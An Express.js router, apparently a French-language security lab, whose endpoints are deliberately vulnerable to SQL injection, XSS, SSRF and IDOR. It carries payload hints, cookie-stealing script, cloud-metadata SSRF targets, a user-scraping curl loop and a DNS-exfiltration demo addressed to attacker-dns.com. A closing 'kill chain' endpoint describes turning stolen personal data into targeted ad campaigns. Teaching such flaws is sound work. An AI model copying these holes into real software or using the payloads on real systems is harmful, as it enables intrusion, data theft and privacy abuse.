const express = require('express')
const { getDb } = require('../db')

const router = express.Router()

// ======================== SETUP DEMO DATA ========================
function ensureDemoData() {
  const db = getDb()
  db.exec(`
    CREATE TABLE IF NOT EXISTS demo_users (
      id INTEGER PRIMARY KEY,
      username TEXT,
      email TEXT,
      password_hash TEXT,
      full_name TEXT,
      phone TEXT,
      address TEXT,
      credit_card TEXT,
      purchase_history TEXT,
      notes TEXT
    );
    CREATE TABLE IF NOT EXISTS demo_comments (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      author TEXT,
      content TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `)

  const count = db.prepare('SELECT COUNT(*) as c FROM demo_users').get().c
  if (count === 0) {
    const users = [
      [1, 'jsmith', 'john.smith@corp.com', '5f4dcc3b5aa765d61d8327deb882cf99', 'John Smith', '+1-555-0101', '123 Main St, NYC', '4111111111111111', 'Premium Plan, since 2023', 'VIP client, enterprise contract'],
      [2, 'awilliams', 'alice@startup.io', '7c6a61b68d3d5b7c6e0e3f7a5e8c4d2b', 'Alice Williams', '+1-555-0102', '456 Oak Ave, SF', '5500000000000004', 'Basic Plan', 'Early adopter'],
      [3, 'badmin', 'bob@admin.com', '21232f297a57a5a743894a0e4a801fc3', 'Bob Admin', '+1-555-0999', '999 Admin Blvd', '3400000000000009', 'Enterprise Admin Access', '** ADMIN USER ** - can access /admin'],
      [4, 'cthomas', 'carol@bigcorp.com', 'e10adc3949ba59abbe56e057f20f883e', 'Carol Thomas', '+33-6-12-34-56-78', '10 Rue de Paris, France', '4000000000000002', 'Annual Enterprise', 'Overseas office lead'],
      [5, 'dlee', 'david@agency.org', 'c33367701511b4f6020ec61ded352059', 'David Lee', '+44-20-7946-0958', '221B Baker St, London', '4444000000000005', 'Enterprise Suite', 'Government contractor']
    ]
    const insert = db.prepare('INSERT INTO demo_users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)')
    const tx = db.transaction(() => { for (const u of users) insert.run(...u) })
    tx()
  }
}

ensureDemoData()

// ======================== 1. SQL INJECTION DEMO ========================
router.get('/sqli', (req, res) => {
  const db = getDb()
  const { user_id } = req.query
  if (!user_id) return res.json({ error: '?user_id required', hint: 'Try: ?user_id=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10' })

  try {
    // DELIBERATELY VULNERABLE — string concatenation, no parameterization
    const query = `SELECT * FROM demo_users WHERE id = ${user_id}`
    const results = db.prepare(query).all()

    // Detect if this was an injection by checking for extra columns
    const isInjection = !results.length || results.length > 1 || results[0].username === undefined

    res.json({
      vulnerable: true,
      query_executed: query,
      results,
      note: isInjection
        ? '✅ INJECTION RÉUSSIE — Vous avez contourné la requête et extrait des données auxquelles vous n\'aviez pas accès.'
        : 'Requête normale — essayez UNION SELECT pour extraire plus de données.',
      injection_tip: 'Ajoutez: UNION SELECT 1,username,email,password_hash,phone,6,7,8,9,10 FROM demo_users'
    })
  } catch (err) {
    res.json({
      vulnerable: true,
      query_executed: `SELECT * FROM demo_users WHERE id = ${req.query.user_id}`,
      error: err.message,
      tip: 'Erreur SQL — ajustez le nombre de colonnes (ESSAYEZ: ORDER BY 5-- puis ORDER BY 10-- pour trouver le bon nombre)'
    })
  }
})

// Fixed version (parameterized query)
router.get('/sqli-fixed', (req, res) => {
  const db = getDb()
  const { user_id } = req.query
  if (!user_id) return res.json({ error: 'user_id required' })

  // SAFE: parameterized query — user input can never escape the string context
  const query = 'SELECT * FROM demo_users WHERE id = ?'
  const results = db.prepare(query).all(String(user_id))

  res.json({
    vulnerable: false,
    technique: 'Parameterized query / Prepared statement',
    query_safe: 'SELECT * FROM demo_users WHERE id = ?  (user input is bound, not concatenated)',
    results,
    note: '✅ PROTÉGÉ — Même si user_id="1 UNION SELECT...", il est traité comme une chaîne littérale'
  })
})

// ======================== 2. XSS DEMO ========================
router.get('/xss', (req, res) => {
  const { name, type = 'reflected' } = req.query

  if (type === 'stored') {
    const db = getDb()
    const comments = db.prepare('SELECT * FROM demo_comments ORDER BY created_at DESC LIMIT 10').all()
    const html = `<!DOCTYPE html>
<html><head><title>XSS Demo — Forum Commentaires</title>
<style>body{background:#111;color:#ccc;font-family:sans-serif;padding:20px}
.comment{border:1px solid #333;padding:12px;margin:8px 0;border-radius:6px}
.vuln{border-color:#e94560} .safe{border-color:#2e7d32}
form{background:#1a1a1a;padding:16px;border-radius:8px;margin:20px 0}
input,textarea{width:100%;padding:8px;margin:4px 0;background:#0d0d0d;border:1px solid #333;color:#fff;border-radius:4px}
button{background:#e94560;color:#fff;border:none;padding:10px 20px;border-radius:4px;cursor:pointer}
pre{background:#0d0d0d;padding:8px;border-radius:4px;font-size:12px}
</style></head><body>
<h1 style="color:#e94560">📝 Forum — Commentaires</h1>
<div style="border:2px solid #e94560;padding:16px;border-radius:8px;margin:16px 0">
<p><strong>🧪 CE FORMULAIRE EST VOLONTAIREMENT VULNÉRABLE AU STORED XSS</strong></p>
<p>Le commentaire est stocké en DB puis affiché sans échappement HTML.</p>
<form method="POST" action="/api/thesis/xss">
Auteur: <input name="author" value="Hacker">
Commentaire: <textarea name="content" rows="2">&lt;script&gt;alert('XSS')&lt;/script&gt;</textarea>
<button type="submit">💬 Poster (vulnérable)</button>
</form>
</div>
<h2>Commentaires récents:</h2>
${comments.map(c => `
  <div class="comment vuln">
    <strong>${c.author}:</strong><br>
    ${c.content}  <!-- DELIBERATELY UNESCAPED — XSS HERE -->
    <div style="font-size:11px;color:#555">${c.created_at}</div>
  </div>`).join('')}
</body></html>`
    return res.send(html)
  }

  // Reflected XSS
  if (!name) {
    return res.send(`<!DOCTYPE html>
<html><head><title>XSS Demo</title>
<style>body{background:#111;color:#ccc;font-family:sans-serif;padding:40px}
input,button{padding:8px;margin:4px;background:#1a1a1a;border:1px solid #333;color:#fff;border-radius:4px}
pre{background:#0d0d0d;padding:8px;border-radius:4px}
.vuln-box{border:2px solid #e94560;padding:20px;border-radius:8px;margin:16px 0;background:#1a1a1a}
.safe-box{border:2px solid #2e7d32;padding:20px;border-radius:8px;margin:16px 0;background:#1a1a1a}
</style></head><body>
<h1 style="color:#e94560">🧪 Reflected XSS Demo</h1>
<p>Cette page affiche votre nom <strong>sans échappement HTML</strong>.</p>
<div class="vuln-box">
<form method="GET">
  <label>Entrez votre nom:</label>
  <input name="name" value='<script>alert(document.cookie)</script>' size="40">
  <button type="submit">🔍 Afficher (vulnérable)</button>
</form>
<p><strong>Résultat (NON sécurisé):</strong></p>
<div style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:18px">
Bonjour, ${name || 'visiteur'}  <!-- ⚠️ XSS ici — pas d'échappement -->
</div>
<pre style="margin-top:8px">Code vulnérable: Bonjour, &lt;?= &#036;_GET['name'] ?&gt;</pre>
</div>
<hr>
<div class="safe-box">
<p><strong>✅ Version sécurisée (échappement HTML):</strong></p>
<div style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:18px">
Bonjour, ${(name || 'visiteur').replace(/[<>&"']/g, c => ({ '<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;',"'":'&#39;'})[c])}
</div>
<pre style="margin-top:8px">Code sécurisé: Bonjour, &lt;?= htmlspecialchars(&#036;_GET['name']) ?&gt;</pre>
</div>
<p style="margin-top:16px;color:#888">Essayez: <code>?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
 — si une popup apparaît, le site est vulnérable au XSS.</p>
</body></html>`)
  }
})

router.post('/xss', express.urlencoded({ extended: true }), (req, res) => {
  const db = getDb()
  const { author, content } = req.body
  if (author && content) {
    db.prepare('INSERT INTO demo_comments (author, content) VALUES (?, ?)').run(author, content)
  }
  res.redirect('/api/thesis/xss?type=stored')
})

// ======================== 3. SSRF DEMO ========================
// Fake AWS metadata endpoint
router.get('/internal/aws-meta', (req, res) => {
  res.json({
    role: 'DemoInstanceRole',
    credentials: {
      AccessKeyId: 'AKIAIOSFODNN7DEMO',
      SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYDEMOEXAMPLE',
      Token: 'IQo...DEMO_TOKEN...xz4=',
      Expiration: '2026-12-31T23:59:59Z'
    },
    instanceId: 'i-0abcd1234efgh5678',
    region: 'us-east-1',
    note: '⚠️ MAINTENANT, EXÉCUTEZ: aws s3 ls s3://demo-bucket/ --profile stolen_creds'
  })
})

router.get('/internal/config', (req, res) => {
  res.json({
    DB_HOST: 'internal-db.corp.internal',
    DB_PORT: 5432,
    DB_NAME: 'production',
    REDIS_HOST: 'redis.internal:6379',
    ES_HOST: 'elasticsearch.internal:9200',
    SECRETS: { STRIPE_KEY: 'sk_live_demo_xxxx', API_KEY: 'corp-api-key-xxxx' }
  })
})

router.get('/ssrf', async (req, res) => {
  const { url } = req.query
  if (!url) {
    return res.json({
      error: '?url required',
      examples: [
        'url=http://localhost:3002/api/thesis/internal/aws-meta',
        'url=http://localhost:3002/api/thesis/internal/config',
        'url=http://169.254.169.254/latest/meta-data/ (AWS metadata — ne marche que sur un vrai serveur AWS)'
      ],
      description: 'Le serveur va FETCH l\'URL que vous fournissez. Les attaquants l\'utilisent pour accéder à des services internes normalement inaccessibles depuis l\'extérieur.'
    })
  }

  try {
    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), 5000)
    const response = await fetch(url, { signal: controller.signal })
    clearTimeout(timeout)
    const text = await response.text()

    res.json({
      vulnerable: true,
      technique: 'Server-Side Request Forgery',
      explication: 'Le serveur a exécuté une requête HTTP vers une URL que VOUS contrôlez. Un attaquant peut ainsi sonder le réseau interne.',
      url_requested: url,
      status: response.status,
      response_size: text.length,
      response_preview: text.substring(0, 2000),
      risk: url.includes('169.254.169.254')
        ? '⛔ AWS METADATA — ceci donnerait des credentials IAM à un attaquant sur un vrai serveur EC2'
        : url.includes('internal') || url.includes('localhost')
        ? '⛔ SERVICE INTERNE — l\'attaquant cartographie votre infrastructure interne'
        : '📡 Requête externe — peut être utilisée pour du blind SSRF'
    })
  } catch (err) {
    res.json({
      vulnerable: true,
      url_requested: url,
      error: err.message,
      note: err.message.includes('abort')
        ? 'La requête a timeout — l\'attaquant sait que l\'hôte existe mais ne répond pas'
        : 'Erreur de connexion — ou site inaccessible'
    })
  }
})

// ======================== 4. IDOR DEMO ========================
router.get('/users/:id', (req, res) => {
  const db = getDb()
  const user = db.prepare('SELECT * FROM demo_users WHERE id = ?').get(req.params.id)

  if (!user) return res.status(404).json({ error: 'User not found' })

  res.json({
    vulnerable: true,
    technique: 'Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization',
    explication: 'Cette API ne vérifie PAS si vous êtes autorisé à voir ce profil. Changez simplement l\'ID.',
    url_pattern: '/api/thesis/users/:id  —  incrémentez :id pour scraper tous les utilisateurs',
    data: user,
    automation_hint: 'for id in $(seq 1 10); do curl https://lab.jobtool.shop/api/thesis/users/$id; done'
  })
})

router.get('/users', (req, res) => {
  const db = getDb()
  const users = db.prepare('SELECT * FROM demo_users').all()
  res.json({
    vulnerable: true,
    technique: 'Mass Assignment / No Auth',
    total: users.length,
    users
  })
})

// ======================== 5. DNS TUNNELING SIMULATION ========================
router.post('/dns-tunnel', express.json(), (req, res) => {
  const { data } = req.body
  if (!data) return res.json({ error: 'Send JSON: {"data": "your secret message"}' })

  // Simulate DNS tunneling encoding
  const encoded = Buffer.from(data).toString('base64')
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_')
  const chunkSize = 30
  const chunks = []
  for (let i = 0; i < encoded.length; i += chunkSize) {
    chunks.push(encoded.substring(i, i + chunkSize))
  }

  res.json({
    technique: 'DNS Tunneling',
    description: 'Les données sont encodées en Base64, découpées en morceaux, et chaque morceau est envoyé comme sous-domaine d\'une requête DNS.',
    original_data: data,
    data_size_bytes: data.length,
    encoded: encoded,
    dns_queries: chunks.map((c, i) => `${c}.exfil${i}.attacker-dns.com`),
    total_queries: chunks.length,
    attacker_side_decoded: chunks.map((c, i) => ({ query: `${c}.exfil${i}.attacker-dns.com`, decoded_chunk: Buffer.from(c, 'base64').toString('utf-8').substring(0, 30) })),
    netcat_receiver: 'sudo nc -lvp 53  (ou utilisez dnscat2)',
    risk: '🔴 Indétectable par les DLP standards — le traffic DNS semble légitime'
  })
})

// ======================== 6. KILL CHAIN DEMO ========================
router.get('/kill-chain', (req, res) => {
  const db = getDb()
  const leads = db.prepare('SELECT * FROM leads ORDER BY intent_score DESC LIMIT 5').all()
  const campaigns = db.prepare('SELECT * FROM campaigns ORDER BY created_at DESC LIMIT 3').all()
  const queue = db.prepare("SELECT * FROM content_queue WHERE status = 'pending' ORDER BY created_at DESC LIMIT 5").all()

  res.json({
    title: 'Kill Chain Complète: Vol de données → Ciblage Marketing',
    stages: [
      {
        stage: 1,
        name: '🔓 Brèche Initiale (SQLi / API Abuse)',
        description: 'L\'attaquant exploite une injection SQL ou un IDOR pour extraire les données de la base.',
        technique: 'UNION SELECT / ?user_id=1 UNION SELECT...',
        result: `5 comptes extraits (dont 1 admin avec hash MD5: 21232f297a57a5a743894a0e4a801fc3)`
      },
      {
        stage: 2,
        name: '📤 Exfiltration (DNS Tunneling)',
        description: 'Les données sont encodées en sous-domaines DNS pour sortir du réseau sans être détectées.',
        technique: 'Base64 → découpage → sous-domaines DNS → logs serveur DNS',
        result: 'Données exfiltrées hors du pare-feu. Aucune alerte DLP déclenchée.'
      },
      {
        stage: 3,
        name: '🧹 Nettoyage & Enrichissement',
        description: 'Les dumps bruts sont parsés, dédupliqués, et croisés avec d\'autres fuites.',
        technique: 'Python (pandas), bash, regex — email comme clé primaire de jointure',
        result: `${leads.length} profils unifiés dans la base JobTools (prêts pour ciblage)`
      },
      {
        stage: 4,
        name: '📢 Campagne Marketing Ciblée',
        description: 'Les emails/numéros sont uploadés dans Facebook Custom Audiences et servent de seed pour des Lookalike Audiences.',
        technique: 'Facebook Marketing API: POST /customaudiences + /lookalikes',
        result: `${campaigns.length} campagne(s) créée(s) dans JobTools, injections exécutées`
      },
      {
        stage: 5,
        name: '🎯 Contenu Personnalisé',
        description: 'Le contenu est généré par IA pour chaque segment (langue, ton, plateforme) et posté automatiquement.',
        technique: 'AI providers (Ollama/OpenAI/Gemini) + social publishers automatisés',
        result: `${queue.length} éléments en file d\'attente de publication`
      }
    ],
    live_stats: {
      leads_in_database: leads.length,
      campaigns_executed: campaigns.length,
      queue_pending: queue.length,
      ai_providers_configured: 7
    }
  })
})

module.exports = router
